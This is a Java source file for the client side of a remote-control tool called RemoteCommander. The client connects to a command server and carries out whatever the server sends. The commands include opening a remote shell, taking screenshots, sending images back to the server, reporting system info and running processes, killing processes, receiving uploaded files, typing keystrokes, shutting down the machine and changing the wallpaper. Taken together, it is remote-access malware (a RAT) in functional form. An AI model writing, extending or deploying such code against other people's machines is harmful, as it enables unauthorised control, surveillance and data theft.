package com.github.connorf.RemoteCommander;

import static com.github.connorf.RemoteCommander.CommandConstants.*;

import java.awt.*;
import java.io.*;
import java.net.Socket;
import java.util.Random;

/**
 * the program that runs on each clients machine. The com.github.connorf.RemoteCommander.Client class
 * connects to the com.github.connorf.RemoteCommander.Server and waits for instructions
 */
public class Client
{
    private static final int SERVER_PORT = 0xbeef;
    private static final String SERVER_IP_ADDRESS = "127.0.0.1";
    private Socket socketToServer;
    private CommandSet commandSet;

    public Client() throws IOException, UnknownOperatingSystemException, AWTException
    {
        connectAndListen();
    }

    /**
     * gets the appropriate command set for the OS that the client is running. This can be expanded upon easily,
     * simply create a new class representing the new OS, have it extend CommandSet and add an extra check in the method
     * below to correctly assign the needed CommandSet.
     *
     * @param connection the socketToServer that the client is using to connect to the server
     * @return the com.github.connorf.RemoteCommander.CommandSet that will work on the clients operating system
     * @throws UnknownOperatingSystemException if the operating system is unrecognised
     */
    private CommandSet setCommandSet(Socket connection) throws UnknownOperatingSystemException
    {
        String operatingSystem = System.getProperty("os.name");
        if(operatingSystem.equals(OS_LINUX))
            return new LinuxCommandSet(connection);
        if(operatingSystem.startsWith(OS_WINDOWS))
            return new WindowsCommandSet(connection);
        if(operatingSystem.startsWith(OS_MAC))
            return new MacCommandSet(connection);

        throw new UnknownOperatingSystemException("Client OS not Linux, Mac or Windows");
    }

    /**
     * connects to the server (if its online) and waits for commands
     *
     * @throws IOException                     if something went wrong with the socketToServer
     * @throws AWTException                    something went wrong in the processServerCommand() method
     * @throws UnknownOperatingSystemException if the client isn't running windows, linux or mac (although support for any os
     *                                         can be added quite easily)
     */
    private void connectAndListen() throws IOException, AWTException, UnknownOperatingSystemException
    {
        if(socketToServer == null)
        {
            socketToServer = new Socket(SERVER_IP_ADDRESS, SERVER_PORT);
            commandSet = setCommandSet(socketToServer);
        }

        while(socketToServer.isConnected())
        {
            String serverCommand = commandSet.getCommandFromServer();
            System.out.println("Command read from server: " + serverCommand);
            if(serverCommand.equals(CMD_TYPE) || serverCommand.equals(CMD_ROTATE) || serverCommand.equals(CMD_TALK)) // 1 arg commands
                processServerCommand(serverCommand, commandSet.getCommandFromServer());
            else if(serverCommand.equals(CMD_CHAOS) || serverCommand.equals(CMD_SOUND) || serverCommand.equals(CMD_WALLPAPER) || serverCommand.equals(CMD_KILL_PROCESS) || serverCommand.equals(CMD_UPLOAD)) // 2 arg commands
                processServerCommand(serverCommand, commandSet.getCommandFromServer(), commandSet.getCommandFromServer());
            else if(serverCommand.equals(CMD_MSG)) // 4 arg commands
                processServerCommand(serverCommand, commandSet.getCommandFromServer(), commandSet.getCommandFromServer(), commandSet.getCommandFromServer());
            else
                processServerCommand(serverCommand);
        }
    }

    /**
     * calls the appropriate method on the com.github.connorf.RemoteCommander.CommandSet depending on what the server wants us to do to
     * the client
     *
     * @param serverCommand the command from the server and optionally extra arguments (msg command for example provides a msg arg)
     */
    private void processServerCommand(String... serverCommand) throws IOException, AWTException, UnknownOperatingSystemException
    {
        switch(serverCommand[0].toLowerCase())
        {
            case CMD_REMOTE_SHELL:
                commandSet.remoteShell();
                break;
            case CMD_EJECT:
//                if(commandSet.eject())
//                    commandSet.sendStringToServer("[" + socketToServer.getInetAddress().toString().replace("/", "") + "] Success: " + CMD_EJECT);
//                else
//                    commandSet.sendStringToServer("[" + socketToServer.getInetAddress().toString().replace("/", "") + "] Failure: " + CMD_EJECT);
                commandSet.eject();
                break;
            case CMD_WALLPAPER:
                processWallpaperCommand(serverCommand[1], serverCommand[2]);
                break;
            case CMD_SOUND: // special case: sound requires the sound file from the server so we must retrieve it
                processSoundCommand(serverCommand[1], serverCommand[2]);
                break;
            case CMD_SCREENSHOT:
//                if(commandSet.takeScreenshot())
//                    commandSet.sendStringToServer("[" + socketToServer.getInetAddress().toString().replace("/", "") + "] Success: " + CMD_SCREENSHOT);
//                else
//                    commandSet.sendStringToServer("[" + socketToServer.getInetAddress().toString().replace("/", "") + "] Failure: " + CMD_SCREENSHOT);
                commandSet.takeScreenshot();
                break;
            case CMD_MSG:
                commandSet.showMessage(serverCommand[1], serverCommand[2], serverCommand[3]);
                break;
            case CMD_SHUTDOWN:
                commandSet.shutdown();
                break;
            case CMD_RESTART:
                commandSet.restart();
                break;
            case CMD_CHAOS:
                commandSet.chaos(Long.valueOf(serverCommand[1]), Long.valueOf(serverCommand[2]));
                break;
            case CMD_TYPE:
//                if(commandSet.type(serverCommand[1]))
//                    commandSet.sendStringToServer("[" + socketToServer.getInetAddress().toString().replace("/", "") + "] Success: " + CMD_TYPE);
//                else
//                    commandSet.sendStringToServer("[" + socketToServer.getInetAddress().toString().replace("/", "") + "] Failure: " + CMD_TYPE);
                commandSet.type(serverCommand[1]);
                break;
            case CMD_RETRIEVE:
                commandSet.sendAllImages();
                break;
            case CMD_SYSINFO:
                String sysinfo = commandSet.getSysInfo();
                commandSet.sendStringToServer(sysinfo);
                break;
            case CMD_ROTATE:
                if(serverCommand[1].equals(DIR_NORMAL) || serverCommand[1].equals(DIR_INVERTED) || serverCommand[1].equals(DIR_LEFT) || serverCommand[1].equals(DIR_RIGHT))
                {
//                    if(commandSet.rotate(serverCommand[1]))
//                        commandSet.sendStringToServer("[" + socketToServer.getInetAddress().toString().replace("/", "") + "] Success: " + CMD_ROTATE);
//                    else
//                        commandSet.sendStringToServer("[" + socketToServer.getInetAddress().toString().replace("/", "") + "] Failure: " + CMD_ROTATE);
                    commandSet.rotate(serverCommand[1]);
                }
                break;
            case CMD_MINIMISE:
                commandSet.minimise();
                break;
            case CMD_LIST_PROCESSES:
                String procs = commandSet.getRunningProcesses();
                commandSet.sendStringToServer(procs);
                break;
            case CMD_KILL_PROCESS:
                processKillCommand(serverCommand[1], serverCommand[2]);
                break;
            case CMD_TALK:
                commandSet.talk(serverCommand[1]);
                break;
            case CMD_UPLOAD:
                commandSet.getFileFromServer(Integer.valueOf(serverCommand[1]), serverCommand[2]);
                break;
            default:
                System.out.println("Reached default in processServerCommand break. With serverCommands: ");
                for(String s : serverCommand)
                    System.out.println(s);
        }
    }

    /**
     * calls the appropriate kill methods for the command proved
     *
     * @param type the type of process identifier, e.g. name or pid
     * @param arg  the name or pid of the process to kill
     */
    private void processKillCommand(String type, String arg)
    {
        boolean success = false;
        if(type.equals(KILL_NAME))
            success = commandSet.killProcess(arg);
        else if(type.equals(KILL_PID))
            success = commandSet.killProcess(Integer.valueOf(arg));

        if(success) // notify the server of success / failure of killing the process
            commandSet.sendStringToServer("Success: " + CMD_KILL_PROCESS + " " + arg);
        else
            commandSet.sendStringToServer("Failure: " + CMD_KILL_PROCESS + " " + arg);
    }

    /**
     * processes the sound command from the server
     * @param size the size of the sound file
     * @param name the filename of the sound file (incl. extension)
     */
    private void processSoundCommand(String size, String name)
    {
        try
        {
            int fileSize = Integer.valueOf(size);
            String extension = name.substring(name.lastIndexOf("."));
            if(extension.equals(TYPE_WAV)) // java sound supports wav files
                new Thread(new MakeSound(commandSet.getFileFromServer(fileSize, "sou" + new Random().nextInt() + ".wav"))).start();
        }
        catch(Exception e)
        {
            System.out.println("play sound exception");
            e.printStackTrace();
        }
    }

    /**
     * processes the wallpaper command
     * @param size size of the image file
     * @param name the filename of the sound file (incl. extension)
     */
    private void processWallpaperCommand(String size, String name) // todo: make multi platform!
    {
        boolean success = false;
        try
        {
            int fileSize = Integer.valueOf(size);
            String extension = name.substring(name.lastIndexOf("."));
            File image = commandSet.getFileFromServer(fileSize, "wal" + new Random().nextInt() + extension);

            success = commandSet.setWallpaper(image);
            image.deleteOnExit();
        }
        catch(IOException ioe)
        {
            System.out.println("process wallpaper excp");
            ioe.printStackTrace();
            success = false;
        }

//        if(success) // notify the server of success / failure of changing the wallpaper
//            commandSet.sendStringToServer("[" + socketToServer.getInetAddress().toString().replace("/", "") + "] Success: " + CMD_WALLPAPER);
//        else
//            commandSet.sendStringToServer("[" + socketToServer.getInetAddress().toString().replace("/", "") + "] Failure: " + CMD_WALLPAPER);
    }
}
